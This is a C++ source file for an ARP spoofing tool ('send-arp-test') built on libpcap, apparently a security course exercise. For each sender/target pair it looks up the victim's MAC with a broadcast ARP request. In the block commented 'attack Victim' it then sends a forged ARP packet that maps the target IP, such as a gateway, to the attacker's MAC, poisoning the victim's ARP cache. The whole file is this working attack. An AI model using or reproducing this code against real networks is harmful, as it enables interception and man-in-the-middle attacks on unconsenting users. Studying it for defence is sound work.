#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mine.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc % 2  == 1 || argc < 3) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	
	for(int i=2; i<argc; i+=2){
		printf("----Set %d----\n", i/2);
		printf("Victim(sender) ip : %s\nTarget ip : %s\n\n", argv[i], argv[i+1]);

		char errbuf[PCAP_ERRBUF_SIZE];
        	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        	if (handle == nullptr) {
                	fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                	return -1;
        	}
		
		uint8_t attacker_mac[7];
        	uint8_t victim_mac[7];

       		uint8_t my_mac[18];     // only for print
       		uint8_t sender_mac[18]; // only for print
		int getMac = GetMacAddress(dev, attacker_mac);

		if(getMac != 0){
			printf("Failed to get MAC address...\n");
			return -1;
		}
		
		hextostr(attacker_mac, my_mac); 	 // print
		printf("Attacker's mac : %s\n", my_mac); // print
		
	
		// step1 : get Victim(Sender)'s mac address
		struct pcap_pkthdr* header;
		const u_char* pckt;
		EthArpPacket packet;
	
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(attacker_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);
	
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(attacker_mac);
		packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(argv[i]));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}	
	
		while(true){
			int reply = pcap_next_ex(handle, &header, &pckt);
			if(reply == 0) continue;	
			if(reply == PCAP_ERROR || reply == PCAP_ERROR_BREAK){
				printf("pcap_next_ex return %d\n",reply);
				pcap_close(handle);
				return -1;
			}
			
			PEthHdr eth_hdr = (PEthHdr)pckt;
			if(ntohs(eth_hdr->type_) == 0x806) break;
			
		}
		PArpHdr arp_hdr = (PArpHdr)(pckt + sizeof(EthHdr));
		//printf("%u bytes captured\n", header->caplen); // print
		hextostr((uint8_t*)arp_hdr+0x8, sender_mac);   // print 
		printf("Victim's mac : %s\n", sender_mac);     // print 	
        
		memcpy(victim_mac, (uint8_t*)((uint8_t*)arp_hdr + 0x8), 7);
	
		// step 2 : attack Victim
		EthArpPacket packet2;
	
		packet2.eth_.dmac_ = Mac(victim_mac);
        	packet2.eth_.smac_ = Mac(attacker_mac);
        	packet2.eth_.type_ = htons(EthHdr::Arp);

        	packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
        	packet2.arp_.pro_ = htons(EthHdr::Ip4);
        	packet2.arp_.hln_ = Mac::SIZE;
        	packet2.arp_.pln_ = Ip::SIZE;
        	packet2.arp_.op_ = htons(ArpHdr::Request);
        	packet2.arp_.smac_ = Mac(attacker_mac);
        	packet2.arp_.sip_ = htonl(Ip(argv[i+1]));
        	packet2.arp_.tmac_ = Mac(victim_mac);
        	packet2.arp_.tip_ = htonl(Ip(argv[i]));

        	int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
        	if (res2 != 0) {
                	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
        	}
		pcap_close(handle);
		printf("\n");
	}
}
